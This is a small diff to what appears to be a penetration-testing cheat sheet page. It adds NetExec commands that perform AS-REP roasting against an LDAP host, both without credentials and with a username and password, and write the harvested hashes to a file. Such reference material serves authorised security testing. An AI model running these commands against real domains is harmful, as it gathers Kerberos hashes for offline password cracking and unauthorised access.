@@ -13,9 +13,12 @@ BloodyAD
 
 {% code overflow="wrap" %}
 ```bash
+## Without cred
 nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
-
 nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
+
+## with cred
+nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
 ```
 {% endcode %}
 
